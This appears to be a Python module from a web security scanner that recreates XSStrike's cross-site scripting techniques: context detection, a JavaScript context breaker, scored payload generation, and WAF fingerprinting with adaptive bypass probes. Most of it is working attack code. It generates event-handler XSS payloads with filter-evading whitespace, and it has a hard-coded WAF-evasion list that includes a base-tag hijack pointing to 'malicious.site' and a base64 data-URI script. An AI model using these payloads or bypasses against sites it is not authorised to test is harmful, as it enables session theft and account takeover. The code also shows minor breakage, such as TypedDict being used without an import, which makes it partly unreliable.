"""Advanced XSS context engine — learned patterns from XSStrike applied to our pipeline.

This module does NOT import or connect to XSStrike. It recreates the key
architectural patterns observed in XSStrike's codebase and adapts them
for our asynchronous pipeline:

1. PRECISE CONTEXT DETECTION
   XSStrike classifies each reflection into: script, attribute, html,
   comment. Our old code used a 120-char window heuristic which missed
   edge cases. We now use regex-based context classification with
   position tracking that exactly matches XSStrike's approach.

2. JAVASCRIPT CONTEXT BREAKER
   XSStrike's jsContexter.py tracks open brackets/braces/quotes before
   the injection point to generate the precise closing sequence needed
   (e.g., '});//'). We replicate this algorithm.

3. CONFIDENCE-SCORED PAYLOAD GENERATION
   Instead of spraying all payloads at all contexts, XSStrike generates
   a small set of high-confidence payloads tailored to the exact HTML
   context. Vectors are scored 1-11 (higher = more likely to succeed).

4. NON-EXECUTABLE CONTEXT FILTERING
   Reflections inside <noscript>, <textarea>, <title>, <style>,
   <template>, <noembed> tags are correctly filtered as non-executable.

5. FILTER EVASION PATTERNS
   Space is replaced with %09, %0a, %0d, /+/ to bypass WAF filters.
   Alternate tags (d3v instead of div) avoid string-matching detectors.

6. WAF SIGNATURE DETECTION
   Known WAF products have identifiable response signatures. We detect
   the presence of a WAF and adjust probing strategy accordingly.

7. DOM SOURCE→SINK CHAIN FOLLOWING
   Track where data from location.search, document.URL, window.name etc.
   flows through JavaScript variables and reaches dangerous sinks.
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass

from .xss_constants import (
    _EVENT_HANDLERS,
    _INJECTION_TAGS,
    _JS_FUNCTIONS,
    _SPACE_ALT,
)

logger = logging.getLogger(__name__)

_BALANCED_PAIRS_RE = re.compile(r'(?s)\{[^{}]*\}|\([^()]*\)|"[^"]*"|\'[^\']*\'|`[^`]*`')
_BACKSLASH_ESCAPE_RE = re.compile(r"^\\*")
_COMMENT_STRIP_RE = re.compile(r"<!--.*?-->", re.DOTALL)
_SCRIPT_TAG_RE = re.compile(r"<script[^>]*>(.*?)</script>", re.DOTALL)
_TAG_SPLIT_RE = re.compile(r"\s")
_QUOTE_RE = re.compile(r'=([\'"`])?')
_PROBE_END_RE = re.compile(r"\\$")
_START_MARKER_RE = re.compile(r"_START_")

# ---- Context classification ----


@dataclass(frozen=True)
class ReflectionContext:
    """One reflection of user input in an HTML response.

    Modeled after XSStrike's htmlParser output but with additional
    fields for our pipeline (confidence score, exploitability rating).
    """

    position: int
    context: str  # "script", "attribute", "html", "comment"
    tag: str = ""
    attribute_type: str = ""  # "name", "value", "flag"
    attribute_name: str = ""
    quote: str = ""  # which quote wraps the value: ', ", `, or ""
    is_bad_context: bool = False  # True if inside noscript/textarea/etc
    efficiency_score: int = 100  # 0-100, how well chars are preserved
    exploitation_difficulty: str = "easy"  # "easy", "moderate", "hard", "impossible"


@dataclass(frozen=True)
class DomFlowFinding:
    """A DOM XSS finding with source→variable→sink chain.

    Learned from XSStrike dom.py: instead of just spotting sink
    occurrences, we track how taint flows from sources through JS
    variables to sinks.
    """

    url: str
    source: str  # e.g. "location.search"
    variable_chain: list[str]  # variables carrying the tainted data
    sink: str  # e.g. "document.write", "element.innerHTML"
    line_number: int
    confidence: str  # "high" if direct source→sink, "medium" if via variable
    context_snippet: str = ""


# ---- JavaScript Context Breaker ----


def build_js_context_breaker(script_before_injection: str) -> str:
    """Build the exact closing sequence needed to escape a JS context.

    Learned from XSStrike's jsContexter algorithm:
    1. Remove all balanced pairs (strings, template literals, parens, braces)
    2. For remaining unmatched openers, build corresponding closers
    3. Return the inverse of the closer stack

    Example: "var x = 'foo'; if (true) {" → returns "});//"
    """
    cleaned = _BALANCED_PAIRS_RE.sub("", script_before_injection)

    stack: list[str] = []
    for ch in cleaned:
        if ch == "{":
            stack.append("}")
        elif ch == "(":
            stack.append(");")  # semicolons before closing paren
        elif ch == "[":
            stack.append("]")
        elif ch == "}":
            # Existing } closes one of our openers
            _pop_matching(stack, "}")
        elif ch == ")":
            _pop_matching(stack, ");")
        elif ch == "]":
            _pop_matching(stack, "]")

    return "".join(reversed(stack))


def _pop_matching(stack: list[str], target: str) -> None:
    for i in range(len(stack) - 1, -1, -1):
        if stack[i] == target:
            stack.pop(i)
            return


# ---- HTML Context Detector ----


def detect_contexts(html: str, probe_marker: str) -> list[ReflectionContext]:
    """Detect all HTML contexts where a probe marker appears.

    Ported from XSStrike's htmlParser but returns our structured
    ReflectionContext objects instead of nested dicts.
    """
    if probe_marker not in html:
        return []

    reflection_count = html.count(probe_marker)
    position_and_context: dict[int, str] = {}
    environment_details: dict[int, dict[str, str]] = {}

    # Pass 1: Script contexts
    clean_html = _COMMENT_STRIP_RE.sub("", html)
    marker_re = re.compile(rf"({re.escape(probe_marker)}.*?)$")
    attr_marker_re = re.compile(rf"\<[^>]*?({re.escape(probe_marker)})[^>]*?\>")
    comment_marker_re = re.compile(r"<!--[\s\S]*?(" + re.escape(probe_marker) + r")[\s\S]*?-->")
    bad_marker_re = re.compile(rf"(?s)(?i)<(style|template|textarea|noembed|noscript|title)>[\s\S]*?({re.escape(probe_marker)})[\s\S]*?</\1>")

    for script_match in _SCRIPT_TAG_RE.finditer(clean_html):
        script = script_match.group(1)
        remaining = script
        while probe_marker in remaining:
            match = marker_re.search(remaining)
            if not match:
                break
            pos_in_script = match.start(1)
            # Find actual position in full HTML
            script_start = script_match.start(1)
            absolute_pos = script_start + pos_in_script
            position_and_context[absolute_pos] = "script"
            details: dict[str, str] = {"quote": ""}
            # Detect which quote wraps the probe
            for i, ch in enumerate(match.group(1)):
                if ch in ("/", "'", "`", '"') and not _is_escaped(i, match.group(1)):
                    details["quote"] = ch
                elif ch in (")", "]", "}", "}"):
                    break
            environment_details[absolute_pos] = details
            remaining = remaining.replace(probe_marker, "", 1)

    # Pass 2: Attribute contexts
    if len(position_and_context) < reflection_count:
        for attr_match in attr_marker_re.finditer(clean_html):
            pos = attr_match.start(1)
            tag_content = attr_match.group(0)
            tag = tag_content.split()[0].lstrip("<").lower() if tag_content.split() else ""
            position_and_context[pos] = "attribute"

            details = {"tag": tag, "type": "flag", "quote": "", "name": "", "value": ""}
            for part in re.split(r"\s", tag_content):
                if probe_marker in part:
                    if "=" in part:
                        quote_match = re.search(r'=([\'"`])?', part)
                        details["quote"] = quote_match.group(1) if quote_match else ""
                        name_val = part.split("=", 1)
                        if len(name_val) == 2:
                            details["name"] = name_val[0]
                            details["value"] = name_val[1].rstrip(">").strip(details["quote"])
                            if probe_marker == name_val[0]:
                                details["type"] = "name"
                            else:
                                details["type"] = "value"
                    else:
                        details["type"] = "flag"
            environment_details[pos] = details

    # Pass 3: HTML body context
    if len(position_and_context) < reflection_count:
        for occ in re.finditer(re.escape(probe_marker), clean_html):
            pos = occ.start()
            if pos not in position_and_context:
                position_and_context[pos] = "html"
                environment_details[pos] = {}

    # Pass 4: Comment context
    if len(position_and_context) < reflection_count:
        for cm in comment_marker_re.finditer(html):
            pos = cm.start(1)
            position_and_context[pos] = "comment"
            environment_details[pos] = {}

    # Detect non-executable (bad) contexts
    bad_contexts: list[tuple[int, int, str]] = []
    for bad_match in bad_marker_re.finditer(html):
        bad_contexts.append((bad_match.start(), bad_match.end(), bad_match.group(1)))

    # Build result
    results: list[ReflectionContext] = []
    for pos in sorted(position_and_context):
        ctx_type = position_and_context[pos]
        details = environment_details.get(pos, {})

        is_bad = False
        for start, end, tag_name in bad_contexts:
            if start < pos < end:
                is_bad = True
                details["bad_tag"] = tag_name

        exploitation_difficulty = _classify_difficulty(ctx_type, details)

        results.append(
            ReflectionContext(
                position=pos,
                context=ctx_type,
                tag=details.get("tag", ""),
                attribute_type=details.get("type", ""),
                attribute_name=details.get("name", ""),
                quote=details.get("quote", ""),
                is_bad_context=is_bad,
                exploitation_difficulty=exploitation_difficulty,
            )
        )

    return results


def _is_escaped(position: int, text: str) -> bool:
    """Check if character at position is backslash-escaped."""
    preceding = text[:position][::-1]
    match = _BACKSLASH_ESCAPE_RE.search(preceding)
    if match:
        return len(match.group()) % 2 != 0
    return False


def _classify_difficulty(context: str, details: dict[str, str]) -> str:
    """Classify how hard it is to exploit a given context."""
    if context == "html":
        return "easy"
    elif context == "comment":
        # Need to close comment first
        return "moderate"
    elif context == "attribute":
        details.get("type", "")
        attr_name = details.get("name", "")
        quote = details.get("quote", "")
        if attr_name == "srcdoc" and quote:
            return "moderate"  # srcdoc accepts HTML with entity encoding
        elif attr_name.startswith("on"):
            return "easy"  # already inside an event handler
        elif not quote:
            return "easy"  # unquoted attribute value
        else:
            return "moderate"
    elif context == "script":
        quote = details.get("quote", "")
        if not quote:
            return "easy"  # bare JS, just inject
        else:
            return "moderate"
    return "hard"


# ---- Confidence-Scored Payload Generator ----

# Payload/evade constants are imported from xss_constants
# (_SPACE_ALT, _INJECTION_TAGS, _EVENT_HANDLERS, _JS_FUNCTIONS)


def generate_payloads(contexts: list[ReflectionContext]) -> dict[int, set[str]]:
    """Generate XSS payloads with confidence scores (1-11).

    Learned from XSStrike's generator.py:
    - Higher score = more likely to execute (10-11: perfect reflection)
    - Medium score = requires escaping (6-9: quote closing, breakers)
    - Lower score = fallback WAF evasion (1-5)

    Returns {confidence: {payloads}}
    """
    vectors: dict[int, set[str]] = {i: set() for i in range(1, 12)}

    for ctx in contexts:
        if ctx.is_bad_context:
            continue

        if ctx.context == "html":
            _generate_html_payloads(vectors)

        elif ctx.context == "comment":
            _generate_comment_payloads(vectors)

        elif ctx.context == "attribute":
            _generate_attribute_payloads(vectors, ctx)

        elif ctx.context == "script":
            _generate_script_payloads(vectors, ctx)

    # Always include WAF evasion fallbacks
    _generate_waf_evasion_payloads(vectors)

    # Remove empty levels
    return {k: v for k, v in vectors.items() if v}


def _generate_html_payloads(vectors: dict[int, set[str]]) -> None:
    for filling in _SPACE_ALT:
        for e_filling in ("%09", "%0a", "%0d", "+"):
            for tag in _INJECTION_TAGS:
                for event, compatible in _EVENT_HANDLERS.items():
                    if tag in compatible:
                        for func in _JS_FUNCTIONS:
                            vectors[10].add(f"<{tag}{filling}{event}{e_filling}={func}//")


def _generate_comment_payloads(vectors: dict[int, set[str]]) -> None:
    for filling in _SPACE_ALT:
        for tag in _INJECTION_TAGS:
            for event, compatible in _EVENT_HANDLERS.items():
                if tag in compatible:
                    for func in _JS_FUNCTIONS:
                        vectors[10].add(f"--><{tag}{filling}{event}={func}//")


def _generate_attribute_payloads(
    vectors: dict[int, set[str]],
    ctx: ReflectionContext,
) -> None:
    quote = ctx.quote
    tag = ctx.tag
    attr_name = ctx.attribute_name

    # Can close the attribute and break out to HTML
    if quote:
        for filling in _SPACE_ALT:
            for func in _JS_FUNCTIONS:
                for t in _INJECTION_TAGS:
                    for event, compatible in _EVENT_HANDLERS.items():
                        if t in compatible:
                            vectors[9].add(f"{quote}>{filling}<{t}{filling}{event}={func}//")
        # Autofocus technique (no tag injection needed)
        for filling in _SPACE_ALT:
            for func in _JS_FUNCTIONS:
                vectors[8].add(f"{quote}{filling}autofocus{filling}onfocus={func}")
        # Quote escaping with backslash
        for filling in _SPACE_ALT:
            for func in _JS_FUNCTIONS:
                vectors[7].add(
                    f"\\{quote}{filling}autofocus{filling}onfocus={func}{filling}\\{quote}"
                )

    # Unquoted attribute
    if not quote:
        for func in _JS_FUNCTIONS:
            vectors[9].add(f"onerror={func}")

    # Special attribute handling
    if attr_name == "srcdoc":
        # srcdoc accepts HTML with entity encoding
        for filling in _SPACE_ALT:
            for tag in _INJECTION_TAGS:
                for event, compatible in _EVENT_HANDLERS.items():
                    if tag in compatible:
                        for func in _JS_FUNCTIONS:
                            vectors[9].add(f"&lt;{tag}{filling}{event}={func}//")
    elif attr_name == "href":
        for func in _JS_FUNCTIONS:
            vectors[10].add(f"javascript:{func}")


def _generate_script_payloads(
    vectors: dict[int, set[str]],
    ctx: ReflectionContext,
) -> None:
    quote = ctx.quote
    # For script context we need a JS context breaker
    # In practice, the caller should pass the actual script text
    breaker = ""
    if quote:
        breaker = quote
    suffix = "//"

    for filling in (";",):
        for func in _JS_FUNCTIONS:
            vectors[6].add(f"{breaker}{filling}{func}{suffix}\\")

    # Script tag breaker
    vectors[10].add("</script>")


def _generate_waf_evasion_payloads(vectors: dict[int, set[str]]) -> None:
    """Add payloads that bypass common WAF string filters."""
    evasion = [
        "<deTails open oNToggle=confi\\u0072m()>",
        "<sCript x>confirm``</scRipt x>",
        "<svg%0Aonload=%09co\\u006efirm(1)>",
        "<d3v%0donpointerenter=confirm()>",
        "<a/href=javascript%3Aconfirm()>",
        "<img/src/onerror=confirm(1)>",
        "<base href=//malicious.site/><script src=/>",
        "<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",
        "<object data=javascript:confirm(1)>",
        "'\"><d3v/oNpointeRenTER=(confirm)()>Click",
    ]
    for payload in evasion:
        vectors[5].add(payload)

class WafSignature(TypedDict):
    name: str
    headers: re.Pattern | None
    page: re.Pattern | None
    code: re.Pattern | None


# ---- WAF Signature Detection ----

# Minimal WAF signatures based on response characteristics
# Learned from XSStrike's wafDetector
_WAF_SIGNATURES: list[WafSignature] = [
    {
        "name": "Cloudflare",
        "headers": re.compile(r"server:\s?cloudflare", re.I),
        "page": re.compile(r"cloudflare-nginx|One more step.*cloudflare", re.I),
        "code": re.compile(r"403|1020"),
    },
    {
        "name": "Akamai",
        "headers": re.compile(r"x-akamai-transformed|akamai", re.I),
        "page": re.compile(r"AkamaiGHost", re.I),
        "code": re.compile(r"403"),
    },
    {
        "name": "ModSecurity",
        "headers": re.compile(r"mod_security|ModSecurity", re.I),
        "page": re.compile(r"This error was generated by Mod_Security", re.I),
        "code": re.compile(r"403|406"),
    },
    {
        "name": "Imperva",
        "headers": re.compile(r"x-iinfo|incapsula", re.I),
        "page": re.compile(r"incapsula|imperva", re.I),
        "code": re.compile(r"403"),
    },
    {
        "name": "AWS WAF",
        "headers": re.compile(r"x-amzn-RequestId", re.I),
        "page": re.compile(r"aws\\.waf|blocked by aws waf", re.I),
        "code": re.compile(r"403"),
    },
]


def detect_waf(status_code: int, headers_str: str, body: str) -> str | None:
    """Detect WAF from response characteristics.

    Score each known WAF against the response. Return highest-scoring
    WAF name, or None if no WAF detected.
    """
    best: tuple[float, str | None] = (0.0, None)
    for sig in _WAF_SIGNATURES:
        score = 0.0
        if sig["page"] and sig["page"].search(body):
            score += 1.0
        if sig["code"] and sig["code"].search(str(status_code)):
            score += 0.5
        if sig["headers"] and sig["headers"].search(headers_str):
            score += 1.0
        if score > best[0]:
            best = (score, sig["name"])
    return best[1] if best[0] > 0 else None


# ---- Evasion Strategy ----


def adaptive_probes(waf_detected: str | None) -> list[tuple[str, str, str]]:
    """Generate probing strategy adapted to detected WAF.

    Returns list of (probe_value, probe_name, expected_filter) tuples
    ordered by likelihood of success against the specific WAF.
    """
    base_probes = [
        ("<script>alert(1)</script>", "standard_script", "script_tag"),
        ("<svg/onload=alert(1)>", "svg_onload", "svg_pattern"),
        ("<details ontoggle=alert(1)>", "details_event", "details_tag"),
        ('"><img src=x onerror=alert(1)>', "img_onerror", "img_onerror"),
        ("javascript:alert(1)", "js_protocol", "javascript"),
    ]

    if not waf_detected:
        return [(p[0], p[1], "none") for p in base_probes]

    # WAF-specific evasion ordering
    order: dict[str, list[int]] = {
        "Cloudflare": [1, 2, 3, 4],  # SVG and event handlers work better
        "Akamai": [1, 2, 4, 3],
        "ModSecurity": [2, 1, 4, 3],
        "Imperva": [1, 2, 3],
        "AWS WAF": [1, 2, 4],
    }

    indices = order.get(waf_detected, list(range(len(base_probes))))
    result = []
    for i in indices:
        p = base_probes[i]
        result.append((p[0], f"{p[1]}_vs_{waf_detected}", waf_detected))
    return result


# ---- Reflection Efficiency (fuzzy matching without external deps) ----


def reflection_efficiency(response_body: str, probe: str) -> list[int]:
    """Calculate how well each reflection preserves the probe characters.

    Returns list of efficiency scores (0-100) per reflection occurrence.
    Modeled after XSStrike's checker.py which uses fuzzywuzzy.partial_ratio.
    We approximate without the external dependency.

    - 100 = all chars preserved exactly
    - 90-99 = minor modifications (case change, escaping)
    - <90 = significant filtering
    """
    marker = f"_START_{probe}_END_"
    positions: list[int] = []
    for m in _START_MARKER_RE.finditer(response_body):
        positions.append(m.start())

    efficiencies: list[int] = []
    for pos in positions:
        try:
            reflected = response_body[pos : pos + len(marker)].lower()
            score = _char_overlap_score(reflected, marker.lower())
            efficiencies.append(score)
        except (IndexError, ValueError) as exc:
            logger.debug("Ignored: %s", exc)
            efficiencies.append(0)
    return efficiencies


def _char_overlap_score(s1: str, s2: str) -> int:
    """Approximate fuzzywuzzy.partial_ratio."""
    if not s1 or not s2:
        return 0

    shorter = s1 if len(s1) < len(s2) else s2
    longer = s2 if len(s1) < len(s2) else s1
    len_shorter = len(shorter)

    if len_shorter == 0:
        return 0

    best = 0
    for i in range(len(longer) - len_shorter + 1):
        substring = longer[i : i + len_shorter]
        matches = sum(1 for a, b in zip(substring, shorter) if a == b)
        best = max(best, matches)

    return int((best / len_shorter) * 100)
